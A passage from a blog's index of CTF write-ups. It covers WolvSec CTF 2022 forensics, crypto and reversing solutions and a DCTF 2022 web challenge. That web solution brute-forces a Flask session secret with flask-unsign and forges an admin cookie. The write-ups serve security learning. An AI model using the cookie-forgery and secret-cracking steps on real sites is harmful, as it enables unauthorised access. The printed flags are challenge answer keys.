class="line">    io.sendline(<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    io.recvline()</span><br><span class="line">    response = io.recv()</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> <span class="string">b&#x27;Bye!&#x27;</span> <span class="keyword">in</span> response):</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure><p><code>Flag : actf&#123;i_c0uld_be_l0nely_with_y0u_a21f8611c74b&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> forensics </tag>
            
            <tag> reversing </tag>
            
            <tag> misc </tag>
            
            <tag> cryptography </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvSec CTF 2022 Writeups</title>
      <link href="/2022/03/27/WolvSec-CTF-2022-Writeups/"/>
      <url>/2022/03/27/WolvSec-CTF-2022-Writeups/</url>
      
        <content type="html"><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a><strong>Forensics</strong></h1><h2 id="Lecture-22-Forensics"><a href="#Lecture-22-Forensics" class="headerlink" title="Lecture_22_Forensics"></a><strong>Lecture_22_Forensics</strong></h2><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>My professor told me I might find something useful in these slides… <strong><a href="https://ctf.wolvseccon.org/files/8c3c514a2c871a1515d92f90cd0f68e6/Lecture_22__Forensics.pdf?token=eyJ1c2VyX2lkIjo1MTYsInRlYW1faWQiOjIxOCwiZmlsZV9pZCI6Mzh9.YkDLng.2skXCwtZnnYGQBjWb8XQ6fd5x84">Lecture_22__Forensics.pdf</a></strong></p><p>We are given a PDF file to download. </p><p>The first thing I always do when I get a PDF file in a CTF challenge is the <code>pdftotext</code> command , It basically converts the pdf to plain text </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdftotext Lecture_22__Forensics.pdf output.txt</span><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbd8c2576-2484-4928-a27a-33a22dcb8b7e%2FUntitled.png?id=fa49a1f5-4381-4e52-9cd8-69d057544824&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1220&userId=&cache=v2" alt="Untitled"></p><p>We stored our output in an <strong>output.txt</strong> file that if we take a look at it we can see our flag.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fcc569198-0c09-4913-a910-393e24b15b33%2FUntitled.png?id=0818c3fc-f00e-4465-887d-1ba5d8032521&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1170&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : wsc&#123;y0u_c4nT_$ee_m3&#125;</code></p><h2 id="Forensics…kinda"><a href="#Forensics…kinda" class="headerlink" title="Forensics…kinda"></a><strong>Forensics…kinda</strong></h2><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>This image has been a bit shifty - can’t seem to find the message my friend encoded in it! <strong><a href="https://ctf.wolvseccon.org/files/a35959217ece44f7c7f8b81d4528e327/Forensics_kinda.png?token=eyJ1c2VyX2lkIjo1MTYsInRlYW1faWQiOjIxOCwiZmlsZV9pZCI6NTd9.YkDM8A.DO6vQqP78QsJwA-no4mREpLNuOA">Forensics_kinda.png</a></strong></p><p>We are given a png file to work with.</p><p>The first thing I tried was <code>zsteg</code> ( I always use this command when working with png files ). It’s a Command-line tool for use against Least Significant Bit steganography… unfortunately only works against PNG and BMP images. You can get it from here <a href="https://github.com/zed-0xff/zsteg">https://github.com/zed-0xff/zsteg</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg Forensics_kinda.png</span><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb8285654-e7c3-4d84-9e55-7326820ce906%2FUntitled.png?id=1c901d3e-cfcf-42be-ba10-a4860b947c49&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : wsc&#123;g0_blu3&#125;</code></p><h2 id="Flaggy"><a href="#Flaggy" class="headerlink" title="Flaggy"></a><strong>Flaggy</strong></h2><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>The flag is just in an image. How could that possibly be a challenge? <strong><a href="https://ctf.wolvseccon.org/files/dba38fdf3dec04f0ca60d5eb32c4ac29/flaggy.jpg?token=eyJ1c2VyX2lkIjo1MTYsInRlYW1faWQiOjIxOCwiZmlsZV9pZCI6NTR9.YkDOBw.fcyATfOp0gjEg4NsvAmx9E2Bglo">flaggy.jpg</a></strong></p><p>We got a flaggy.jpg image to download. </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9e69e34b-94a7-4535-b2b0-cc19bbea3b3f%2Fflaggy.jpg?id=1e9bf826-2b8e-4af9-bbcd-9833120595e5&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1070&userId=&cache=v2" alt="flaggy.jpg"></p><p>We can see some interesting things like <em>RSA</em> , 3,2,2,3 .. hmmm</p><p>I then checked the <code>strings</code> and I found this </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F86581b84-2109-401e-bc47-537c06d19b5e%2FUntitled.png?id=d3ba5761-5047-4f05-9aaf-d4fa1b134c5a&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1320&userId=&cache=v2" alt="Untitled"></p><p>As you can see we are given n and c , now we are sure that we are working with RSA.</p><p>Running <code>exiftool</code> gives as the same values before and the value of e</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb45f78aa-4bc6-4b45-a4c6-eb1fd65533db%2FUntitled.png?id=c5dec63f-b82f-46e2-9d9d-1acd9060ea98&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1420&userId=&cache=v2" alt="Untitled"></p><p>Let’s note those values </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = 2175313499</span><br><span class="line">c = 2017794776</span><br><span class="line">e = 13 </span><br></pre></td></tr></table></figure><p>That’s exactly what we need to write our RSA script in order to get our flag.</p><p>First we need to get the value of <code>p</code> and <code>q</code> , to do so let’s head over to <a href="http://factordb.com/">http://factordb.com/</a> to factorize <code>n</code> </p><p>Now we got <code>p</code> and <code>q</code> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe34254d2-ee03-4de5-9136-593fe6fff699%2FUntitled.png?id=31fbc6eb-20a2-4073-8343-241f637d526d&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1750&userId=&cache=v2" alt="Untitled"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = 32377</span><br><span class="line">q = 67187</span><br></pre></td></tr></table></figure><p>The next step is finding <code>phi</code> which is : </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phi = (p-1) * (q-1)</span><br></pre></td></tr></table></figure><p>Last but not least gonna calculate <code>d</code> which is :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = pow(e , -1 , phi)</span><br></pre></td></tr></table></figure><p>Now we have all the values of <code>c</code> , <code>d</code> and <code>n</code> , we can get our flag 🙂 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = pow(c,d,n)</span><br></pre></td></tr></table></figure><p>Putting our script together </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">2175313499</span></span><br><span class="line">e = <span class="number">13</span></span><br><span class="line">c = <span class="number">2017794776</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">32377</span></span><br><span class="line">q = <span class="number">67187</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e , -<span class="number">1</span> , phi)</span><br><span class="line">flag = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure><p>Running the script we get the following output </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1024965103</span></span><br></pre></td></tr></table></figure><p>If you remember from the picture give in the challenge <em>“decrypted int in 3,2,2,3” .</em> So all we need to do is splitting our output into 3,2,2,3 like that <code>102 49 65 103</code> , these are decimal values that when we convert we get <code>f1Ag</code> and that’s our flag.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff1da4968-f399-4d2b-81fa-e57d6ba4f4c2%2FUntitled.png?id=d78b9416-2c5d-460b-bb07-71fd5858e78d&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1620&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : wsc&#123;f1Ag&#125;</code></p><h2 id="Noise"><a href="#Noise" class="headerlink" title="Noise"></a><strong>Noise</strong></h2><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>My buddy sent me this totally RAW clip of them playing guitar. Doesn’t sound quite right to me, something might be off. Also don’t listen with headphones at the end! <strong><a href="https://ctf.wolvseccon.org/files/5fe7a8a4ab68ab3080232d408d0e812b/noise.wav?token=eyJ1c2VyX2lkIjo1MTYsInRlYW1faWQiOjIxOCwiZmlsZV9pZCI6MzF9.YkDTOA.plJg_AkzdKOmsh18P1cliBtPQ8g">noise.wav</a></strong></p><p>We are given a wav file to download</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F07061ddc-08a1-4e1e-be4f-a65626a86219%2FUntitled.png?id=eb827411-40ff-4b32-9fe5-115991bf9b47&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1460&userId=&cache=v2" alt="Untitled"></p><p>Running <code>strings</code> as usual we find the following </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa46c44c8-4371-49ac-a115-45c84192965a%2FUntitled.png?id=f952e350-dc96-4e9b-b1ab-365ce7743ded&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=880&userId=&cache=v2" alt="Untitled"></p><blockquote><p>how can I view photoshop raws???.</p></blockquote><p>hmmm that’s sus .</p><p>I opened the file in <code>sonic-visualiser</code> and I added a <code>spectrogram</code> hoping to find the flag there ( sometimes challenges that gives audio files have the flag in the spectrogram channels )</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F35e14343-c166-46d3-8a30-8d2e24e3e227%2FUntitled.png?id=dafe45b0-c304-4b34-a2dc-acca00db0004&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>Unfortunately, there is no flag this time :3 </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F823f166e-28ca-46ef-a230-21d9f9e8deda%2FUntitled.png?id=964d9402-afa2-4235-aa83-d32673698b66&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1430&userId=&cache=v2" alt="Untitled"></p><p>I then tried <code>stegolsb</code> <a href="https://github.com/ragibson/Steganography">https://github.com/ragibson/Steganography</a> to look for possible hidden data inside the file</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegolsb wavsteg -r -i noise.wav -o file.txt -b 200</span><br></pre></td></tr></table></figure><p>but we only got some garbage </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe7f7fe63-a72a-4d9c-b4a1-3b95c163dace%2FUntitled.png?id=4abcff3b-9d73-4c58-9955-17b52df0f30d&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>I thought maybe I should give up on this challenge , but then I re-read the description which mentioned <em>RAW</em> and the sentence we found earlier in the strings <em>how can I view photoshop raws???</em> . I got this idea of renaming the file from <code>noise.wav</code> to <code>noise.raw</code> and then opening it in photoshop. I fired up photoshop and opened the file noise.raw there.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc384c47a-8d72-4180-9333-4e4bab9d4eab%2FUntitled.png?id=f60e4371-77df-468c-bb82-5fd82847a189&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=640&userId=&cache=v2" alt="Untitled"></p><p>Here I set the dimensions to <code>1500 x 1500</code> then I hit the OK button. Now as you can see we have the following image aaand look what’s sneaking there, it’s our flag! </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F435e0b29-c869-45c2-bc2b-14d7a2ba8356%2FUntitled.png?id=1737d311-8598-43ac-b153-c7ac588b3c01&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>It’s barely readable though, so I started playing little bit with the setting in order for us to be able to read it.</p><p>I changed the mode to bitmap</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fdf0aff34-e470-4047-922f-5e4de2b092e6%2FUntitled.png?id=b0e3c210-ed60-4bfd-9e14-f109641d5930&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=590&userId=&cache=v2" alt="Untitled"></p><p>default value for the output 72</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbeb2988a-e863-4e3a-8eec-23c1159d9788%2FUntitled.png?id=810af030-5f2a-49c8-ac9b-601353374838&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=740&userId=&cache=v2" alt="Untitled"></p><p>Now we can see better I guess</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9999c135-8b0f-4ae0-9415-05f0c8b6bfab%2FUntitled.png?id=55fd71f8-b457-484e-8d89-15fd9560bc2a&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : wsc&#123;t0t4ally_w1ck3d_dud3&#125;</code></p><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA-With-The-Dogs"><a href="#RSA-With-The-Dogs" class="headerlink" title="RSA With The Dogs"></a><strong>RSA With The Dogs</strong></h2><h3 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>I was doing RSA with the dogs so that we could send stuff to each other. Unfortunately the cats are stealing our messages… <strong><a href="https://ctf.wolvseccon.org/files/d7bf01ea91f29760f8baed62d45654f7/gen.sage?token=eyJ1c2VyX2lkIjo1MTYsInRlYW1faWQiOjIxOCwiZmlsZV9pZCI6NjJ9.YkHUtg.FXcXQ6oGCK_GtofVQwlzlxb3u1c">gen.sage</a></strong></p><p>We are given this script </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line">p = random_prime(<span class="number">2</span>^(<span class="number">1024</span>//<span class="number">2</span>),<span class="literal">False</span>,<span class="number">2</span>^(<span class="number">1023</span>//<span class="number">2</span>))</span><br><span class="line">q = random_prime(<span class="number">2</span>^(<span class="number">1024</span>//<span class="number">2</span>),<span class="literal">False</span>,<span class="number">2</span>^(<span class="number">1023</span>//<span class="number">2</span>))</span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">done = <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">d = getrandbits(<span class="number">1024</span>//<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> (gcd(d,phi) == <span class="number">1</span> <span class="keyword">and</span> <span class="number">36</span>*<span class="built_in">pow</span>(d,<span class="number">4</span>) &lt; n):</span><br><span class="line">done = <span class="literal">True</span></span><br><span class="line">Flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read().encode()</span><br><span class="line">m=bytes_to_long(Flag)</span><br><span class="line">e = Integer(d).inverse_mod(phi)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line">n = <span class="number">80958280137410344469270793621735550547403923964041971008952114628165974409360380289792220885326992426579868790128162893145613324338067958789899179419581085862309223717281585829617191377490590947730109453817502130283318153315193437990052156404947863059961976057429879645314342452813233368655425822274689461707</span></span><br><span class="line">e = <span class="number">3575901247532182907389411227211529824636724376722157756567776602226084740339294992167070515627141715229879280406393029563498781044157896403506408797685517148091205601955885898295742740813509895317351882951244059944509598074900130252149053360447229439583686319853300112906033979011695531155686173063061146739</span></span><br><span class="line">c = <span class="number">80629080505342932586166479028264765764709326746119909040860609021743893395577080637958779561184335633322859567681317501709922573784403504695809067898870536224427948000498261469984511352960143456934810825186736399371084350678586129000118485271831798923746976704036847707653422361120164687989605124465224952493</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n)) == m)</span><br></pre></td></tr></table></figure><p>It’s <strong>Wiener’s attack</strong> <a href="https://en.wikipedia.org/wiki/Wiener%27s_attack">https://en.wikipedia.org/wiki/Wiener's_attack</a></p><p>I used <strong><strong>RsaCtfTool</strong></strong> <a href="https://github.com/Ganapati/RsaCtfTool">https://github.com/Ganapati/RsaCtfTool</a> to solve this challenge </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RsaCtfTool.py -e 3575901247532182907389411227211529824636724376722157756567776602226084740339294992167070515627141715229879280406393029563498781044157896403506408797685517148091205601955885898295742740813509895317351882951244059944509598074900130252149053360447229439583686319853300112906033979011695531155686173063061146739 -n 80958280137410344469270793621735550547403923964041971008952114628165974409360380289792220885326992426579868790128162893145613324338067958789899179419581085862309223717281585829617191377490590947730109453817502130283318153315193437990052156404947863059961976057429879645314342452813233368655425822274689461707 --uncipher 80629080505342932586166479028264765764709326746119909040860609021743893395577080637958779561184335633322859567681317501709922573784403504695809067898870536224427948000498261469984511352960143456934810825186736399371084350678586129000118485271831798923746976704036847707653422361120164687989605124465224952493 --attack wiener</span><br></pre></td></tr></table></figure><p>Output </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc22967dc-7441-4cc9-9953-d5df6c63e105%2FUntitled.png?id=9f1825ae-978e-4f2e-8309-03ef6cfe9da7&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : wsc&#123;w13n3r5_wer3_bre4d_t0_hunt_b4dger5!&#125;</code></p><hr><h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="babyre1"><a href="#babyre1" class="headerlink" title="babyre1"></a><strong>babyre1</strong></h2><h3 id="Challenge-Description-5"><a href="#Challenge-Description-5" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>Is FLAG encoded already? Did I forget to call encode()? <strong><a href="https://ctf.wolvseccon.org/files/958689a9284344817392a0b5e8439ed9/babyre1?token=eyJ1c2VyX2lkIjo1MTYsInRlYW1faWQiOjIxOCwiZmlsZV9pZCI6NTJ9.YkHY8Q.YPuKpOZMWuKuCVy6SIHSR7pbzdA">babyre1</a></strong></p><p><strong>solve.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">76</span>, <span class="number">72</span>, <span class="number">88</span>, <span class="number">64</span>, <span class="number">98</span>, <span class="number">11</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">15</span>, <span class="number">73</span>, <span class="number">8</span>, <span class="number">100</span>, <span class="number">92</span> ,<span class="number">8</span>, <span class="number">79</span>, <span class="number">79</span>, <span class="number">10</span>, <span class="number">85</span>, <span class="number">92</span>, <span class="number">100</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">8</span>, <span class="number">100</span>, <span class="number">83</span>, <span class="number">15</span> ,<span class="number">85</span>, <span class="number">92</span>, <span class="number">100</span>, <span class="number">11</span>, <span class="number">93</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">104</span>, <span class="number">26</span>, <span class="number">70</span> ]</span><br><span class="line">r=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    r += <span class="built_in">chr</span>(flag[i]^<span class="number">59</span>)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> forensics </tag>
            
            <tag> reversing </tag>
            
            <tag> cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-intro writeup [DCTF 2022]</title>
      <link href="/2022/02/18/web-intro-writeup-DCTF-2022/"/>
      <url>/2022/02/18/web-intro-writeup-DCTF-2022/</url>
      
        <content type="html"><![CDATA[<p>Hello friends, in this article we gonna take a look at the challenge web-intro from the DCTF 2022.</p><p><code>Challenge description : Are you an admin?</code></p><p>We are given an address to connect to the website : <code>35.246.158.241:31589</code>.<br>When entering the website we see this messages saying <code>Access Denied</code></p><p><img src="https://user-images.githubusercontent.com/55143192/154682416-75910091-87da-4bb7-a6ae-2270bae44b9b.png" alt="https://user-images.githubusercontent.com/55143192/154682416-75910091-87da-4bb7-a6ae-2270bae44b9b.png"></p><p>Looking at the source code we can’t see anything. But if we look at the cookies we can see our session.</p><p><img src="https://user-images.githubusercontent.com/55143192/154682466-fa96058a-0432-4ff2-8f0d-1cd7dad655d1.png" alt="https://user-images.githubusercontent.com/55143192/154682466-fa96058a-0432-4ff2-8f0d-1cd7dad655d1.png"></p><p>Taking the value to <a href="http://jwt.io/">jwt.io</a> to decode it , we get the following :</p><p><img src="https://user-images.githubusercontent.com/55143192/154682516-1ef59ba5-647b-40e4-aec1-1a8f271333d5.png" alt="https://user-images.githubusercontent.com/55143192/154682516-1ef59ba5-647b-40e4-aec1-1a8f271333d5.png"></p><p><code>&#123;&quot;logged_in&quot;: false&#125;</code></p><p>As we can see We are dealing with Flask Session Cookies, so I googled some “flask cheat sheet hacktricks” I got this amazing article which cover the Flask Session Cookies</p><p><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/flask">https://book.hacktricks.xyz/pentesting/pentesting-web/flask</a>.<br>Following this article , first thing we gonna do is decoding the cookie using the following command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --decode --cookie &#x27;eyJsb2dnZWRfaW4iOmZhbHNlfQ.Yg9geQ.s8MKSRemMQyS5S60QTS0lY0Xg0o’</span><br></pre></td></tr></table></figure><p>by doing that We get the following output ( like <a href="http://jwt.io/">jwt.io</a> earlier )</p><p><img src="https://user-images.githubusercontent.com/55143192/154682876-71b4251e-c84c-4fe6-aefe-39cb1ad76390.png" alt="https://user-images.githubusercontent.com/55143192/154682876-71b4251e-c84c-4fe6-aefe-39cb1ad76390.png"></p><p>Now we need to bruteforce the secret which was used to sign the original cookie and for this we gonna use this command :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --unsign --cookie &lt; cookie.txt</span><br></pre></td></tr></table></figure><p>where <code>cookie.txt</code> is the file containing our cookie. [ We can also use this command : <code>flask-unsign --unsign --server &lt;target&gt;</code> ]</p><p><img src="https://user-images.githubusercontent.com/55143192/154683028-690ea2cb-6527-4723-9e40-0a75c21bb6dc.png" alt="https://user-images.githubusercontent.com/55143192/154683028-690ea2cb-6527-4723-9e40-0a75c21bb6dc.png"></p><p>Quickly we get our secret key which is <code>password</code> . Now all we need to do is signing the cookie with the secret <code>password</code> but we need to change the <code>&#123;&quot;logged_in&quot;: false&#125;</code> to <code>&#123;&quot;logged_in&quot;: True&#125;</code> .</p><p>So the command will be :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;logged_in&#x27;: True&#125;&quot; --secret &#x27;password&#x27;</span><br></pre></td></tr></table></figure><p>After doing that we get our new cookie.</p><p><img src="https://user-images.githubusercontent.com/55143192/154683085-956d94b2-39ab-40be-8369-0abbd83dd680.png" alt="https://user-images.githubusercontent.com/55143192/154683085-956d94b2-39ab-40be-8369-0abbd83dd680.png"></p><p>Am using a cool chrome extension called <code>EditThisCookie</code> . Simply paste the value there and hit the green thingy.</p><p><img src="https://user-images.githubusercontent.com/55143192/154683179-ff942d2b-1d75-4af6-abe2-ba5700493e8e.png" alt="https://user-images.githubusercontent.com/55143192/154683179-ff942d2b-1d75-4af6-abe2-ba5700493e8e.png"></p><p>Refresh the page and theeereeeee We go!! We got our flag</p><p><img src="https://user-images.githubusercontent.com/55143192/154684162-60aa982a-bab4-4b56-8c12-ce6fd95eadea.png" alt="https://user-images.githubusercontent.com/55143192/154684162-60aa982a-bab4-4b56-8c12-ce6fd95eadea.png"></p><p><code>flag : CTF&#123;66bf8ba5c3ee2bd230f5cc2de57c1f09f471de8833eae3ff7566da21eb141eb7&#125;</code></p><p>I hope You enjoyed this writeup :)</p><p>PS : The challenge is available in the Educational Archive here :<br><a href="https://app.cyberedu.ro/challenges/93550ce0-8a54-11ec-b670-134e64dab450/">https://app.cyberedu.ro/challenges/93550ce0-8a54-11ec-b670-134e64dab450/</a></p>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
